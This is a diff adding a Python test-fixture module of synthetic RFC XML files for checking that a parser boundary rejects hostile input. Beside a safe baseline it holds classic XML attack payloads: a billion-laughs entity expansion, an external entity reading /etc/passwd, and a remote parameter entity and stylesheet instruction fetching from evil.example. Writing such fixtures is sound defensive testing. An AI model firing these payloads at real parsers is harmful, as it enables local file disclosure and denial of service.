@@ -1,0 +1,102 @@
+"""Synthetic RFC v3 XML fixtures: one safe baseline and one per hostile shape.
+
+No fixture here contains real RFC text. The safe baseline is deliberately
+minimal — just enough structure for the boundary and the structure extractor to
+have something valid to accept.
+"""
+
+from __future__ import annotations
+
+from pathlib import Path
+
+SAFE_RFC_XML = """<?xml version='1.0' encoding='utf-8'?>
+<rfc xmlns:xi="http://www.w3.org/2001/XInclude" number="9999" version="3">
+  <front>
+    <title abbrev="Synthetic">A Synthetic Specification</title>
+  </front>
+  <middle>
+    <section anchor="intro" numbered="true">
+      <name>Introduction</name>
+      <t>This paragraph exists so the tree has content.</t>
+      <section anchor="scope" numbered="true">
+        <name>Scope</name>
+        <t>See <xref target="intro"/> and <xref target="RFC9110"/>.</t>
+      </section>
+    </section>
+  </middle>
+  <back>
+    <references>
+      <name>Normative References</name>
+      <reference anchor="RFC9110"><front><title>Placeholder</title></front></reference>
+    </references>
+  </back>
+</rfc>
+"""
+
+DOCTYPE_XML = """<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE rfc>
+<rfc number="9999" version="3"><front><title>T</title></front></rfc>
+"""
+
+INTERNAL_ENTITY_XML = """<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE rfc [ <!ENTITY greeting "hello"> ]>
+<rfc number="9999" version="3"><front><title>&greeting;</title></front></rfc>
+"""
+
+BILLION_LAUGHS_XML = """<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE rfc [
+  <!ENTITY a "aaaaaaaaaa">
+  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+]>
+<rfc number="9999" version="3"><front><title>&d;</title></front></rfc>
+"""
+
+EXTERNAL_ENTITY_XML = """<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE rfc [ <!ENTITY leak SYSTEM "file:///etc/passwd"> ]>
+<rfc number="9999" version="3"><front><title>&leak;</title></front></rfc>
+"""
+
+EXTERNAL_PARAMETER_ENTITY_XML = """<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE rfc [ <!ENTITY % remote SYSTEM "https://evil.example/e.dtd"> %remote; ]>
+<rfc number="9999" version="3"><front><title>T</title></front></rfc>
+"""
+
+STYLESHEET_PI_XML = """<?xml version='1.0' encoding='utf-8'?>
+<?xml-stylesheet type="text/xsl" href="https://evil.example/x.xsl"?>
+<rfc number="9999" version="3"><front><title>T</title></front></rfc>
+"""
+
+WRONG_ROOT_XML = """<?xml version='1.0' encoding='utf-8'?>
+<html><body><p>Not an RFC.</p></body></html>
+"""
+
+MALFORMED_XML = """<?xml version='1.0' encoding='utf-8'?>
+<rfc number="9999" version="3"><front><title>Unclosed</front></rfc>
+"""
+
+
+def write(directory: Path, name: str, content: str | bytes) -> Path:
+    """Write one fixture as a private regular file and return its path."""
+    path = directory / name
+    if isinstance(content, str):
+        path.write_text(content, encoding="utf-8")
+    else:
+        path.write_bytes(content)
+    path.chmod(0o600)
+    return path
+
+
+def write_safe(directory: Path, name: str = "rfc9999.xml") -> Path:
+    return write(directory, name, SAFE_RFC_XML)
+
+
+def write_invalid_utf8(directory: Path, name: str = "bad.xml") -> Path:
+    prologue = b"<?xml version='1.0' encoding='utf-8'?>\n<rfc><front><title>"
+    return write(directory, name, prologue + b"\xff\xfe" + b"</title></front></rfc>")
+
+
+def write_oversized(directory: Path, limit: int, name: str = "big.xml") -> Path:
+    filler = "x" * (limit + 1)
+    return write(directory, name, f"<?xml version='1.0'?>\n<rfc>{filler}</rfc>")
